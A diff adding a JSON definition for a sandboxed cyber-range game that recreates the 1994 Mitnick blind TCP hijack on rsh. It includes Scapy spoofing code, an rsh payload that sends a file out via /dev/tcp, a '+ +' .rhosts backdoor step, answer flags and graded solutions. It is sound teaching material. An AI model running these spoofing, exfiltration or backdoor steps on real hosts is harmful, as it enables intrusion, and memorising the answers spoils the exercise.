@@ -1,0 +1,150 @@
+{
+  "title": "The Mitnick Attack",
+  "description": "A hands-on recreation of the 1994 Mitnick attack: blind TCP session hijacking against a trusted-host (rsh) relationship, based on the SEED Labs 'Mitnick Attack Lab'.",
+  "prerequisites": [
+    "TCP three-way handshake",
+    "Basic packet sniffing (tcpdump/Wireshark)",
+    "Basic Python"
+  ],
+  "outcomes": [
+    "You will understand why unauthenticated, IP-based trust (rsh/.rhosts) is exploitable.",
+    "You will understand blind TCP session hijacking: ISN prediction/observation, SYN flooding to silence a trusted host, and spoofed handshake completion.",
+    "You will write a sniff-and-spoof program with Scapy that forges a TCP connection on someone else's behalf."
+  ],
+  "state": "UNRELEASED",
+  "show_stepper_bar": true,
+  "variant_sandboxes": true,
+  "estimated_duration": 55,
+  "levels": [
+    {
+      "title": "Briefing",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "# Please read before you start\n\n* Submitting a level's solution **reveals it** for the rest of your group — the levels build directly on each other, so do not reveal ahead of where you actually are.\n* This game recreates the real 1994 attack against Tsutomu Shimomura's machines, using the SEED Labs 20.04 'Mitnick Attack Lab' (Wenliang Du). It is for educational use only; launching this kind of attack against systems you do not own or have written permission to test is illegal.\n\n# Scenario\n\nIn 1994, two of Shimomura's machines trusted each other: **X-Terminal** would accept a remote shell (`rsh`) from the **Trusted Server** without asking for a password, because at the time TCP sequence numbers were predictable and nobody checked more than the source IP address.\n\nYou are Mitnick. You have a shell on a third machine, the **Attacker**, sitting on the same network as the other two. Your goal: without ever having valid credentials on X-Terminal, get it to run a command on your behalf by impersonating the Trusted Server — and then leave yourself a permanent backdoor so you never have to repeat the attack.\n\nAll three machines live inside one VM as Docker containers on a shared internal network, `10.9.0.0/24` — exactly as in the original SEED Lab manual. Once you are in, `dockps` lists the running containers and `docksh <id>` drops you into one."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 2,
+      "minimal_possible_solve_time": null,
+      "passkey": "start",
+      "cloud_content": "Access the sandbox, then submit **`start`**.\n\n### Sandbox access\n1. In the topology overview, right-click **`seed-vm`** → **Open GUI**, or use SSH (see [documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access)).\n2. Log in as **`user`** / **`Password123`**.\n3. Run `dockps` to confirm three containers are already up: `xterminal-10.9.0.5`, `trustedserver-10.9.0.6`, and `attacker`.\n4. `docksh <id>` into the **attacker** container. You will do everything from here — you never need, and never get, a shell on X-Terminal or the Trusted Server.",
+      "local_content": "This sandbox has not been tested for use with a local sandbox."
+    },
+    {
+      "title": "Recon: the trust relationship",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 5,
+      "minimal_possible_solve_time": 120,
+      "answer": "514",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "From the **attacker** container, scan both other hosts (`nmap 10.9.0.5`, `nmap 10.9.0.6`). Both run the old BSD remote-shell service, `rshd` — the same service that let Shimomura log into X-Terminal from the Trusted Server with no password, via a `.rhosts` entry on X-Terminal.\n\nThe flag is the TCP port that `rshd` listens on.",
+      "solution": "```\nuser@attacker:~# nmap 10.9.0.5\nPORT    STATE SERVICE\n514/tcp open  shell\n\nuser@attacker:~# nmap 10.9.0.6\nPORT    STATE SERVICE\n514/tcp open  shell\n```\nThe flag is `514`.",
+      "solution_penalized": true,
+      "hints": [
+        { "title": "Which tool?", "content": "`nmap <ip>` against each host.", "hint_penalty": 0.5, "order": 0 },
+        { "title": "Which service name shows up?", "content": "nmap labels port 514/tcp as `shell` — that's the BSD `rsh` protocol's listening port.", "hint_penalty": 1, "order": 1 }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 2,
+      "reference_solution": [
+        { "state_name": "scanned_xterminal", "prereq_state": [], "cmd": "nmap 10.9.0.5", "cmd_type": "bash-command", "cmd_regex": "nmap( -[A-Za-z]+)* 10\\.9\\.0\\.5", "optional": false },
+        { "state_name": "scanned_trustedserver", "prereq_state": [], "cmd": "nmap 10.9.0.6", "cmd_type": "bash-command", "cmd_regex": "nmap( -[A-Za-z]+)* 10\\.9\\.0\\.6", "optional": false }
+      ],
+      "mitre_techniques": ["T1046"],
+      "expected_commands": ["nmap 10.9.0.5", "nmap 10.9.0.6"],
+      "commands_required": false
+    },
+    {
+      "title": "Confirm the Trusted Server is silenced",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": 300,
+      "answer": "SA",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "In the real attack, Mitnick first had to **silence** the Trusted Server with a SYN-flood, so that when X-Terminal later replies to a connection the Trusted Server never actually asked for, the Trusted Server's own kernel doesn't just send a RST and kill it. That silencing has already been simulated for you in this sandbox (the Trusted Server drops unsolicited inbound SYN+ACK packets at the firewall level) — your job in this level is to *prove it*, the way Mitnick would have needed to before trusting the rest of the attack.\n\nFrom the **attacker** container:\n1. Start a capture: `tcpdump -i <bridge-iface> -n host 10.9.0.5` (find the right bridge interface with `ip a` or `brctl show` — look for the one carrying `10.9.0.0/24` traffic; plain `eth0` inside the container will not see it, you need the bridge device itself).\n2. Using Scapy, send a single spoofed SYN packet to X-Terminal:10.9.0.5 port 514, with the source IP address set to the Trusted Server's address (10.9.0.6) and source port 1023 (this is the fixed source port `rsh` clients use — using a different one causes `rshd` to reset the connection later).\n3. Watch your capture. X-Terminal will reply — and nothing will reset the connection, because the Trusted Server never sees that reply.\n\nThe flag is the two-letter Scapy flag string (e.g. `\"S\"`, `\"SA\"`, `\"R\"`) set on the packet X-Terminal sends back.",
+      "solution": "```python\nfrom scapy.all import *\nip = IP(src=\"10.9.0.6\", dst=\"10.9.0.5\")\ntcp = TCP(sport=1023, dport=514, flags=\"S\", seq=1000)\nsend(ip/tcp)\n```\nCaptured reply: `10.9.0.5:514 -> 10.9.0.6:1023 [SYN, ACK]` — flags `SA`. No RST ever follows, because the Trusted Server is silenced and never sees its own SYN+ACK.",
+      "solution_penalized": true,
+      "hints": [
+        { "title": "Which interface do I sniff on?", "content": "Not `eth0`. Find the Docker bridge device for the `10.9.0.0/24` network with `ip a` and capture on that.", "hint_penalty": 1, "order": 0 },
+        { "title": "What source port?", "content": "Source port must be `1023` — that's what real `rsh` clients use, and it's what X-Terminal/rshd expects later in the attack.", "hint_penalty": 0.5, "order": 1 },
+        { "title": "What am I looking for?", "content": "You're checking the TCP flags field on the packet X-Terminal sends in response to your spoofed SYN.", "hint_penalty": 1, "order": 2 }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 3,
+      "reference_solution": [
+        { "state_name": "found_bridge_iface", "prereq_state": ["scanned_xterminal", "scanned_trustedserver"], "cmd": "ip a", "cmd_type": "bash-command", "cmd_regex": "ip (a|addr|link)( show)?", "optional": false },
+        { "state_name": "confirmed_silenced", "prereq_state": ["found_bridge_iface"], "cmd": "python3 probe_syn.py", "cmd_type": "bash-command", "cmd_regex": "python3? .*\\.py", "optional": false }
+      ],
+      "mitre_techniques": ["T1498"],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Hijack the connection",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 25,
+      "minimal_possible_solve_time": 600,
+      "answer": null,
+      "answer_variable_name": "flag_hijack",
+      "variant_answers": true,
+      "content": "Now do it for real. An `rsh` session is actually **two** TCP connections: the first (client → `rshd` on port 514) carries the authentication data and the command; the second (server → client, on a port the client chose) is for error output, and `rshd` refuses to run anything unless it is also established.\n\n**Restriction** (this is graded on your code, not just the final flag): you may only act on information a real off-path attacker could get. From any packet you sniff, you may use:\n* the TCP **sequence number** field (never the acknowledgment field — you never legitimately see what the Trusted Server received),\n* the TCP **flags** field,\n* length fields (IP header length, IP total length, TCP header length).\n\nTemplates are in `/volumes/` inside the attacker container: `conn1_spoof.py` and `conn2_spoof.py`. Finish them:\n\n1. **Connection 1** (`conn1_spoof.py`): spoof a SYN from the Trusted Server (10.9.0.6:1023) to X-Terminal (10.9.0.5:514). Sniff X-Terminal's SYN+ACK to read its sequence number, then spoof the ACK that completes the handshake. Immediately after, send the rsh data payload:\n   `\"<port>\\x00seed\\x00seed\\x00cat flag_hijack.txt > /dev/tcp/10.9.0.6/<port>\\x00\"`\n   — pick a port (e.g. `9090`) for the second connection and use it consistently in both scripts.\n2. **Connection 2** (`conn2_spoof.py`): X-Terminal will now try to open a second connection to the Trusted Server on the port you chose. Sniff the SYN, spoof the matching SYN+ACK as if you were the Trusted Server.\n3. Run `conn2_spoof.py` first (it needs to be listening before X-Terminal's command executes), then `conn1_spoof.py`.\n4. If both connections complete, X-Terminal runs your command and pipes `flag_hijack.txt`'s contents back over the first connection — watch for it in your capture.\n\nThe flag is the exact content of `flag_hijack.txt`, which you just read off the wire without ever logging into X-Terminal.",
+      "solution": "Completing `conn1_spoof.py`'s `spoof()` handler: on seeing X-Terminal's `SA` packet, send `IP(src=\"10.9.0.6\",dst=\"10.9.0.5\")/TCP(sport=1023,dport=514,flags=\"A\",seq=<your_syn_seq>+1,ack=<their_seq>+1)`, then immediately `send(ip/tcp/rsh_data)` with the 4-field rsh payload. `conn2_spoof.py` mirrors this for the second connection, replying `SA` to X-Terminal's `SYN` on the chosen port. Once both connections exist, `rshd` on X-Terminal runs the `cat` command and the flag streams back over connection 1, visible in `tcpdump`/Wireshark.",
+      "solution_penalized": true,
+      "hints": [
+        { "title": "Order of operations", "content": "Start `conn2_spoof.py` before `conn1_spoof.py` — X-Terminal opens the second connection only after it receives your first rsh data packet, and `rshd` will give up if nothing answers it in time.", "hint_penalty": 1, "order": 0 },
+        { "title": "What goes wrong if my ACK's sequence number is off by one?", "content": "The acknowledgment number in your spoofed ACK must be exactly (X-Terminal's SYN+ACK sequence number) + 1 — same off-by-one rule as a normal handshake.", "hint_penalty": 1.5, "order": 1 },
+        { "title": "rsh data format", "content": "Four `\\x00`-separated fields, in order: the port for connection 2, the client user ID, the server user ID, the command — with a trailing `\\x00`.", "hint_penalty": 1, "order": 2 },
+        { "title": "Source port for connection 1", "content": "Must be exactly `1023`, or `rshd` resets the session right after you think you've succeeded.", "hint_penalty": 2, "order": 3 },
+        { "title": "I don't see the flag come back", "content": "Check you're sniffing the right bridge interface and that `conn2_spoof.py` is already running and listening before `conn1_spoof.py` sends the rsh data.", "hint_penalty": 1, "order": 4 }
+      ],
+      "incorrect_answer_limit": 15,
+      "attachments": ["conn1_spoof.py", "conn2_spoof.py"],
+      "max_score": 10,
+      "reference_solution": [
+        { "state_name": "conn2_listener_up", "prereq_state": ["confirmed_silenced"], "cmd": "python3 conn2_spoof.py", "cmd_type": "bash-command", "cmd_regex": "python3? .*conn2_spoof\\.py", "optional": false },
+        { "state_name": "conn1_attack_sent", "prereq_state": ["conn2_listener_up"], "cmd": "python3 conn1_spoof.py", "cmd_type": "bash-command", "cmd_regex": "python3? .*conn1_spoof\\.py", "optional": false }
+      ],
+      "mitre_techniques": ["T1557", "T1205"],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Plant the backdoor",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 13,
+      "minimal_possible_solve_time": 180,
+      "answer": null,
+      "answer_variable_name": "flag_backdoor",
+      "variant_answers": true,
+      "content": "Repeating that whole attack every time would be exhausting. Mitnick didn't — he planted a backdoor on his first visit.\n\n`rshd` trusts any host listed in a user's `.rhosts` file. Putting the two characters `+ +` in it means *trust everyone, no password, ever*.\n\nRe-run the attack from the previous level, but replace the command in your rsh data with:\n```\necho + + > .rhosts\n```\n(run it as the `seed` user's home directory is where `rshd` looks). Once it succeeds, you no longer need the Attacker's spoofing scripts at all — `rsh 10.9.0.5 cat flag_backdoor.txt` from the attacker container should now work with no password, because X-Terminal will trust a request from *anyone*.\n\nThe flag is the content of `flag_backdoor.txt`, retrieved via your new backdoor.",
+      "solution": "```\nuser@attacker:~# rsh 10.9.0.5 cat flag_backdoor.txt\n```\nworks with no password prompt, because X-Terminal's `.rhosts` now contains `+ +`.",
+      "solution_penalized": true,
+      "hints": [
+        { "title": "Where does `.rhosts` need to end up?", "content": "The home directory of the `seed` user on X-Terminal — same place the original trust entry for the Trusted Server already lived.", "hint_penalty": 0.5, "order": 0 },
+        { "title": "Do I need the spoofing scripts again after this?", "content": "No — once `+ +` is in `.rhosts`, plain `rsh 10.9.0.5 <command>` from the attacker container works directly, no spoofing needed.", "hint_penalty": 1, "order": 1 }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 5,
+      "reference_solution": [
+        { "state_name": "backdoor_planted", "prereq_state": ["conn1_attack_sent"], "cmd": "python3 conn1_spoof.py --backdoor", "cmd_type": "bash-command", "cmd_regex": ".*conn1_spoof\\.py.*", "optional": false },
+        { "state_name": "finish", "prereq_state": ["backdoor_planted"], "cmd": "rsh 10.9.0.5 cat flag_backdoor.txt", "cmd_type": "bash-command", "cmd_regex": "rsh 10\\.9\\.0\\.5 cat flag_backdoor\\.txt", "optional": false }
+      ],
+      "mitre_techniques": ["T1098", "T1133"],
+      "expected_commands": ["rsh 10.9.0.5 cat flag_backdoor.txt"],
+      "commands_required": false
+    }
+  ]
+}
